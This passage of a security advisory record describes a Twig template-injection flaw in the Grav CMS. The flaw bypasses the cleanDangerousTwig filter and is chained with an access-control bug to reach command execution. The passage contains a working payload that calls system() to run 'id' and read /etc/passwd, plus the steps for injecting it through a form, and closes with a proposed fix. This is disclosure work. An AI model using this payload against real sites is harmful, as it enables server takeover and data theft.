This vulnerability stems from weak regex validation in the `cleanDangerousTwig` method.\n\n### Important\n- First of all this vulnerability is due to weak sanitization in the method `clearDangerousTwig`, so any other class that calls it indirectly through for example `$twig->processString` to sanitize code is also vulnerable.\n\n- For this report, we will need the official Form and Admin plugin installed, also I will be chaining this with another vulnerability to allow an editor which is a user with only pages permissions to edit the process section of a form.\n\n- I made another report for the other vulnerability which is a Broken Access Control which allows a user with full permission for pages to change the process section by intercepting the request and modifying it.\n\n### Permissions Needed\n- The main case for this vulnerability is an editor which can unconditionally takeover the whole system through creating a vulnerable form.\n- Second case is as an unauthenticated user, so if the form exists already and accepts user input and puts it through `evaluate_twig`, a guest can takeover the system.\n\n### Details\nWhen we make a form with a process section and a `message` action, when the form is submitted we get to deal with `onFormProcess` in `form.php` through the `message` case:\n\n```php\n            case 'message':\n                $translated_string = $this->grav['language']->translate($params);\n                $vars = array(\n                    'form' => $form\n                );\n\n                /** @var Twig $twig */\n                $twig = $this->grav['twig'];\n                $processed_string = $twig->processString($translated_string, $vars);\n\n                $form->message = $processed_string;\n                break;\n```\n\nWhich takes our parameters as in our action values, like in our case the value of our `message` action and sends it to `processString` which then calls the method `cleanDangerousTwig` from `Security.php`, now here's where we find the vulnerability is caused by two things:\n\n- First of all is weak regex which doesn't account for nested function calls, which allows us to bypass this function's sanitization\n- Second issue which is the `evaluate` and `evaluate_twig` functions which are allowed, and since we can call Twig syntax from inside them, it will lead to nested function calls which we can bypass and thus execute arbitrary payloads.\n\n```php\n    public static function cleanDangerousTwig(string $string): string\n    {\n        if ($string === '') {\n            return $string;\n        }\n\n        $bad_twig = [\n            'twig_array_map',\n            'twig_array_filter',\n            'call_user_func',\n            'registerUndefinedFunctionCallback',\n            'undefined_functions',\n            'twig.getFunction',\n            'core.setEscaper',\n            'twig.safe_functions',\n            'read_file',\n        ];\n         \n        // This allows for a payload like {{ evaluate(\"read_file('/etc/passwd')\") }}\n        $string = preg_replace('/(({{\\s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n        return $string;\n    }\n```\n\n### PoC\n\nFirst to showcase how the function handles the payload, I built a small php program that replicates the behavior of `cleanDangerousTwig`:\n\n```php\n<?php\n\nfunction cleanDangerousTwig(string $string): string\n{\n    if ($string === '') {\n        return $string;\n    }\n\n    $bad_twig = [\n        'twig_array_map',\n        'twig_array_filter',\n        'call_user_func',\n        'registerUndefinedFunctionCallback',\n        'undefined_functions',\n        'twig.getFunction',\n        'core.setEscaper',\n        'twig.safe_functions',\n        'read_file',\n    ];\n    $string = preg_replace('/(({{\\s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n\n    return $string;\n}\n\n$x = $argv[1];\necho cleanDangerousTwig(\"evaluate_twig('$x')\");\n```\n\nWe can run the program with this payload:\n\n```bash\nphp ok.php \"{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} {% set a = grav.config.set('system.twig.undefined_functions',false) %} {{ grav.twig.twig.getFunction('cat /etc/passwd') }}\"\n```\n\nOur payload goes through and not one malicious function is filtered:\n\n```\nevaluate_twig('{# {{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} #} {# {% set a = grav.config.set('system.twig.undefined_functions',false) %} #} {# {{ grav.twig.twig.getFunction('cat /etc/passwd') }} #}')\n```\n\nNow we know that our payload definitely works so let's try it through a custom form this time, as an editor:\n\n- Go to pages\n- Add a page and create a new form or choose an exiting one\n\nWe will be using another vulnerability I found which is a Broken Access Control vulnerability, which allows an editor with basically only pages rights to modify a form's action sections without being in expert mode ( please refer to [it's report](https://github.com/getgrav/grav/security/advisories/GHSA-v8x2-fjv7-8hjh) ), so when we go to our form and save it, we can intercept the request and inject the following payload into `data[_json][header][form]` which is the header for our form which we shouldn't normally be able to modify:\n\n```\n{\"name\":\"ssti-test 2\",\"fields\":{\"name\":{\"type\":\"text\",\"label\":\"Name\",\"required\":true}},\"buttons\":{\"submit\":{\"type\":\"submit\",\"value\":\"Submit\"}},\"process\":[]}\n```\n\nURL-encode it before sending it should look something like this:\n\n![image](https://github.com/user-attachments/assets/c3345f1f-c613-4534-a15c-bd1cf7e4b2f5)\n\n![image](https://github.com/user-attachments/assets/e9685357-b85d-432a-842b-27a28487b7d1)\n\nRequest sent and processed! Now when you go to our form file you can see added a process section with the value of message changed:\n\n![image](https://github.com/user-attachments/assets/c87bdc3b-712c-465f-bd0d-9951ca826a6a)\n\nContent of form:\n\n```\ntitle: Home\nprocess:\n    markdown: true\n    twig: true\nform:\n    name: test\n    fields:\n        name:\n            type: text\n            label: Name\n            required: true\n    buttons:\n        submit:\n            type: submit\n            value: submit\n    process:\n        -\n            message: '{{ evaluate_twig(form.value(''name'')) }}'\n```\n\nNow in the process section, notice our message action is gonna take value from the Name input, using the following payload we will execute the command `id` on the system:\n\n```\n{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} {% set a = grav.config.set('system.twig.undefined_functions',false) %} {{ grav.twig.twig.getFunction('id') }}\n```\n\nNow we can visit the page and input our payload, submit and we got command result:\n\n![image](https://github.com/user-attachments/assets/46571c3c-53ad-4028-b607-8c8f1c26b0c2)\n\n\n### Impact\n\nAllows an attacker to execute arbitrary commands, leading to full system compromise, including unauthorized access, data theft, privilege escalation, and disruption of services.\n\n### Recommended Fix\n\n- Blacklist both the `evaluate` and `evaluate_twig` functions.\n- We could add second check to `cleanDangerousTwig` where we would look for each malicious function no matter it's position:\n\n```php\n<?php\n\nfunction cleanDangerousTwig(string $string): string\n{\n    if ($string === '') {\n        return $string;\n    }\n\n    $bad_twig = [\n        'twig_array_map',\n        'twig_array_filter',\n        'call_user_func',\n        'registerUndefinedFunctionCallback',\n        'undefined_functions',\n        'twig.getFunction',\n        'core.setEscaper',\n        'twig.safe_functions',\n        'read_file',\n    ];\n    $string = preg_replace('/(({{\\s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n\n    foreach ($bad_twig as $func) {\n        $string = preg_replace('/\\b' . preg_quote($func, '/') . '(\\s*\\([^)]*\\))?\\b/i', '{# $1 #}', $string);\n    }\n\n    return $string;\n}\n\n$x = $argv[1];\necho cleanDangerousTwig(\"evaluate_twig('$x')\");\n```\n\nWhen we run this, the result is:\n```\nevaluate_twig('{# {{ grav.twig.twig.{#  #}('system') }} #} {# {% set a = grav.config.set('system.twig.{#  #}',false) %} #} {# {{ grav.twig.{#  #}('cat /etc/passwd') }} #}')\n```\nYou can see we managed to stop the payload and filter out the malicious functions.","affected":[{"package":{"name":"getgrav/grav","ecosystem":"Packagist","purl":"pkg:composer/getgrav/grav"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"1.8.0-beta.27"}]}],"versions":["0.8.0","0.9.0","0.9.1","0.9.10","0.9.11","0.9.12","0.9.13","0.9.14","0.9.15","0.9.16","0.9.17","0.9.18","0.9.19","0.9.2","0.9.20","0.9.21","0.9.22","0.9.23","0.9.24","0.9.25","0.9.26","0.9.27","0.9.28","0.9.29","0.9.3","0.9.30","0.9.31","0.9.32","0.9.33","0.9.34","0.9.35","0.9.36","0.9.37","0.9.38","0.9.39","0.9.4","0.9.40","0.9.41","0.9.42","0.9.43","0.9.44","0.9.45","0.9.5","0.9.6","0.9.7","0.9.8","0.9.9","1.0.0","1.0.0-rc.1","1.0.0-rc.2","1.0.0-rc.3","1.0.0-rc.4","1.0.0-rc.5","1.0.0-rc.6","1.0.1","1.0.10","1.0.2","1.0.3","1.0.4","1.0.5","1.0.6","1.0.7","1.0.8","1.0.9","1.1.0","1.1.0-beta.1","1.1.0-beta.2","1.1.0-beta.3","1.1.0-beta.4","1.1.0-beta.5","1.1.0-rc.1","1.1.0-rc.2","1.1.0-rc.3","1.1.1","1.1.10","1.1.11","1.1.12","1.1.13","1.1.14","1.1.15","1.1.16","1.1.17","1.1.2","1.1.3","1.1.4","1.1.5","1.1.6","1.1.7","1.1.8","1.1.9","1.1.9-rc.1","1.1.9-rc.2","1.1.9-rc.3","1.2.0","1.2.0-rc.1","1.2.0-rc.2","1.2.0-rc.3","1.2.1","1.2.2","1.2.3","1.2.4","1.3.0","1.3.0-rc.1","1.3.0-rc.2","1.3.0-rc.3","1.3.0-rc.4","1.3.0-rc.5","1.3.1","1.3.10","1.3.2","1.3.3","1.3.4","1.3.5","1.3.6","1.3.7","1.3.8","1.3.9","1.4.0","1.4.0-beta.1","1.4.0-beta.2","1.4.0-beta.3","1.4.0-rc.1","1.4.0-rc.2","1.4.1","1.4.2","1.4.3","1.4.4","1.4.5","1.4.6","1.4.7","1.4.8","1.5.0","1.5.0-beta.1","1.5.0-beta.2","1.5.0-rc.1","1.5.1","1.5.10","1.5.2","1.5.3","1.5.4","1.5.5","1.5.6","1.5.7","1.5.8","1.5.9","1.6.0","1.6.0-beta.1","1.6.0-beta.2","1.6.0-beta.3","1.6.0-beta.4","1.6.0-beta.5","1.6.0-beta.6","1.6.0-beta.7","1.6.0-beta.8","1.6.0-rc.1","1.6.0-rc.2","1.6.0-rc.3","1.6.0-rc.4","1.6.1","1.6.10","1.6.11","1.6.12","1.6.13","1.6.14","1.6.15","1.6.16","1.6.17","1.6.18","1.6.19","1.6.2","1.6.20","1.6.21","1.6.22","1.6.23","1.6.24","1.6.25","1.6.26","1.6.27","1.6.28","1.6.29","1.6.3","1.6.30","1.6.31","1.6.4","1.6.5","1.6.6","1.6.7","1.6.8","1.6.9","1.7.0","1.7.0-beta.1","1.7.0-beta.10","1.7.0-beta.2","1.7.0-beta.3","1.7.0-beta.4","1.7.0-beta.5","1.7.0-beta.6","1.7.0-beta.7","1.7.0-beta.8","1.7.0-beta.9","1.7.0-rc.1","1.7.0-rc.10","1.7.0-rc.11","1.7.0-rc.12","1.7.0-rc.13","1.7.0-rc.14","1.7.0-rc.15","1.7.0-rc.16","1.7.0-rc.17","1.7.0-rc.18","1.7.0-rc.19","1.7.0-rc.2","1.7.0-rc.20","1.7.0-rc.3","1.7.0-rc.4","1.7.0-rc.5","1.7.0-rc.6","1.7.0-rc.7","1.7.0-rc.8","1.7.0-rc.9","1.7.1","1.7.10","1.7.12","1.7.13","1.7.14","1.7.15","1.7.16","1.7.17","1.7.18","1.7.19","1.7.20","1.7.21","1.7.22","1.7.23","1.7.24","1.7.25","1.7.26","1.7.26.1","1.7.27","1.7.27.1","1.7.28","1.7.29","1.7.29.1","1.7.3","1.7.30","1.7.31","1.7.32","1.7.33","1.7.34","1.7.35","1.7.36","1.7.37","1.7.37.1","1.7.38","1.7.39","1.7.39.1","1.7.39.2","1.7.39.3","1.7.39.4","1.7.4","1.7.40","1.7.41","1.7.41.1","1.7.41.2","1.7.42","1.7.42.1","1.7.42.2","1.7.42.3","1.7.43","1.7.44","1.7.45","1.7.46","1.7.47","1.7.48","1.7.49","1.7.49.1","1.7.49.2","1.7.49.3","1.7.49.4","1.7.49.5","1.7.5","1.7.6","1.7.7","1.7.8","1.7.9","1.8.0-beta.1","1.8.0-beta.10","1.8.0-beta.11","1.8.0-beta.12","1.8.0-beta.13","1.8.0-beta.14","1.8.0-beta.15","1.8.0-beta.16","1.8.0-beta.17","1.8.0-beta.18","1.8.0-beta.19","1.8.0-beta.2","1.8.0-beta.20","1.8.0-beta.21","1.8.0-beta.22","1.8.0-beta.23","1.8.0-beta.24","1.8.0-beta.25","1.8.0-beta.26","1.8.0-beta.3","1.8.0-beta.4","1.8.0-beta.5","1.8.0-beta.6","1.8.0-beta.7","1.8.0-beta.8","1.8.0-beta.9"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-662m-56v4-3r8f/GHSA-662m-56v4-3r8f.json"}}],"references":[{"type":"WEB","url":"https://github.com/getgrav/grav/security/advisories/GHSA-662m-56v4-3r8f"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-66294"},{"type":"WEB","url":"https://github.com/getgrav/grav/commit/e37259527d9c1deb6200f8967197a9fa587c6458"},{"type":"PACKAGE","url":"https://github.com/getgrav/grav"}],"database_specific":{"cwe_ids":["CWE-1336","CWE-94"],"github_reviewed":true,"github_reviewed_at":"2025-12-02T01:25:16Z","nvd_published_at":"2025-12-01T21:15:52Z","severity":"HIGH"},"severity":[{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"}]}
